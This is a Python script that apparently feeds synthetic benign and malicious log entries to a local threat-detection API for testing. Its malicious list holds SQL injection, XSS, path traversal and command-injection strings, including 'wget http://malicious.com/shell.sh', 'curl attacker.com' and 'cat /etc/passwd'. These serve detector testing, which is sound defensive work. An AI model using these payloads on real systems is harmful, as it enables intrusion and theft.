import random
import asyncio
import aiohttp
import json
from datetime import datetime
from src.models import LogEntry

class ThreatDataGenerator:
    def __init__(self, api_url: str = "http://localhost:8000"):
        self.api_url = api_url
        
        self.benign_payloads = [
            "GET /api/users HTTP/1.1",
            "POST /api/login HTTP/1.1",
            "GET /dashboard HTTP/1.1",
            "POST /api/update HTTP/1.1"
        ]
        
        self.malicious_payloads = [
            # SQL Injection
            "' OR '1'='1' --",
            "UNION SELECT username, password FROM users",
            "'; DROP TABLE users; --",
            
            # XSS
            "<script>alert('XSS')</script>",
            "javascript:alert(document.cookie)",
            "<img src=x onerror=alert('XSS')>",
            
            # Command Injection
            "; cat /etc/passwd",
            "| wget http://malicious.com/shell.sh",
            "&& curl attacker.com",
            
            # Path Traversal
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]
    
    def generate_log_entry(self, malicious: bool = False) -> LogEntry:
        """Generate a log entry"""
        return LogEntry(
            timestamp=datetime.now(),
            source_ip=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            endpoint="/api/endpoint",
            method=random.choice(["GET", "POST", "PUT", "DELETE"]),
            payload=random.choice(self.malicious_payloads if malicious else self.benign_payloads),
            user_agent="Mozilla/5.0",
            status_code=200 if not malicious else random.choice([200, 403, 500]),
            metadata={"id": str(random.randint(1000, 9999))}
        )
    
    async def send_log(self, session: aiohttp.ClientSession, log_entry: LogEntry):
        """Send log entry to API"""
        try:
            # Use model_dump_json to properly serialize datetime
            log_json = log_entry.model_dump_json()
            log_dict = json.loads(log_json)
            async with session.post(
                f"{self.api_url}/api/analyze",
                json=log_dict
            ) as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None
        except Exception as e:
            print(f"Error sending log: {e}")
            return None
    
    async def generate_traffic(self, duration: int = 60, rate: int = 10):
        """Generate traffic for specified duration"""
        print(f"🚀 Generating traffic for {duration} seconds at {rate} logs/sec")
        print(f"   20% will be malicious traffic")
        
        async with aiohttp.ClientSession() as session:
            start_time = datetime.now()
            logs_sent = 0
            
            while (datetime.now() - start_time).seconds < duration:
                # Generate batch
                batch_tasks = []
                for _ in range(rate):
                    is_malicious = random.random() < 0.2  # 20% malicious
                    log_entry = self.generate_log_entry(malicious=is_malicious)
                    batch_tasks.append(self.send_log(session, log_entry))
                
                # Send batch
                await asyncio.gather(*batch_tasks)
                logs_sent += rate
                
                if logs_sent % 100 == 0:
                    print(f"   Sent {logs_sent} logs...")
                
                await asyncio.sleep(1)
        
        print(f"✅ Traffic generation complete. Sent {logs_sent} logs")

async def main():
    generator = ThreatDataGenerator()
    # Run continuously instead of just 60 seconds
    await generator.generate_traffic(duration=3600, rate=10)  # Run for 1 hour

if __name__ == "__main__":
    asyncio.run(main())
